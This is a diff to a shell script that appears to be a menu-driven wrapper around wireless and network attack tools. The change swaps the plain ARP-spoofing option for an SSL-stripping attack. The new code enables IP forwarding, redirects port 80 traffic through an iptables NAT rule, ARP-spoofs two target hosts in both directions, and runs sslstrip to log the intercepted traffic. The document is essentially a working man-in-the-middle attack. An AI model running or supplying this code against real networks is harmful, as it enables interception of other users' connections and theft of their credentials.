@@ -39,7 +39,7 @@ while [ exit != 2 ]; do
 		airodump2 "Airodump-ng bssid specific" \
 		aireplay "Aireplay-ng" \
 		pyrit "Pyrit (for caps)" \
-		arpspoof "arpspoof" \
+		sslstrip "SSLStrip" \
 		ettercap "Open ettercap GUI" 2>CHOICE \
 		quit "Quit"
 	
@@ -91,15 +91,16 @@ while [ exit != 2 ]; do
 		pyrit -r $PYRITCAP -i $PYRITWORDLIST attack_passthrough
 	;;
 	
-	arpspoof)
+	sslstrip)
 		auto_map
 	
 		echo 1 > /proc/sys/net/ipv4/ip_forward
-		#ARPSPOOFHOST=$(cat ARPSPOOFHOST)
-		#ARPSPOOFCLIENT=$(cat ARPSPOOFCLIENT)
+		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
 	
 		xterm -e arpspoof -i wlan0 -t $ARPSPOOFHOST $ARPSPOOFCLIENT &
 		xterm -e arpspoof -i wlan0 -t $ARPSPOOFCLIENT $ARPSPOOFHOST &
+
+		sslstrip -k -l 8080 -w /root/Desktop/sslstrip.log 
 	
 		echo "Press enter to terminate..."
 		read enter
